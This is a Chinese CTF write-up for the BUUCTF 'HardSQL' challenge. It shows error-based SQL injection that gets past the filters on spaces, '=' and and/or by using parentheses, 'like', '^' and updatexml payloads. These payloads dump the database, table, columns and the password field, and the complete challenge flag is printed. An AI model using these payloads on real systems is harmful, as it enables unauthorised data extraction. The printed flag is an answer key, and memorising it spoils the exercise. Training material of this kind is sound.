# [[极客大挑战 2019]HardSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL)



## 0x00先判断闭合



```sql
http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password=admin%27
```



结果为

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin''' at line 1
```



存在" ' "闭合



## 0x01进行注入



```sql
http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password=admin' order by 1%23
```



发现被过滤



经测试：and、or、空格、=、等都被过滤了（建议直接抓包使用fuzz跑）



空格和“=”用不了，所以我们要使用（）来代替空格，使用like来代替”=“ ，^  等同于 and  



## 0x02使用报错注入extractvalue、updatexml函数



这里使用updatexml函数，查询四件套



```sql
http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(database())),'~'),1)%23


~的ASCII码值就是0x7e
```



结果为



```sql
XPATH syntax error: '~geek~'
```



## 0x03继续使用updatexml函数查询表名，字段等



```sql
http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),'~'),1)%23
```



结果为



```sql
XPATH syntax error: '~H4rDsq1~'
```



继续查找H4rDsq1表下的内容



```sql
http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),'~'),1)%23
```



结果为



```sql
XPATH syntax error: '~id,username,password~'
```



查找password字段下的内容



```sql
http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(password)from(H4rDsq1)),'~'),1)%23
```



找到一半flag



```sql
XPATH syntax error: '~flag{6de4f947-feea-4f48-af1e-b1'
```



## 0x04找另一半，从右往左截取



```sql
http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(right((password),30))from(H4rDsq1)),'~'),1)%23
```



找到另一半flag



```sql
XPATH syntax error: '~7-feea-4f48-af1e-b1e92a5d9227}~'
```



将2个拼接得到完整flag



flag{6de4f947-feea-4f48-af1e-b1e92a5d9227}



## 0x05补充



wp参考[BUUCTF-Web_第一页_WP总结笔记](https://blog.aabyss.cn/post-130.html)



[XPath 语法](https://www.w3school.com.cn/xpath/xpath_syntax.asp)



[SQL server中截取字符串的常用函数--LEFT()、RIGHT()、SUBSTRING()](https://blog.csdn.net/lanxingbudui/article/details/87979290)



[学习基于extractvalue()和updatexml()的报错注入](https://blog.csdn.net/zpy1998zpy/article/details/80631036?spm=a2c6h.12873639.0.0.1f1b78cek8ZUwJ)



[sql报错注入：extractvalue、updatexml报错原理](https://developer.aliyun.com/article/692723#slide-2)





作者

SihUi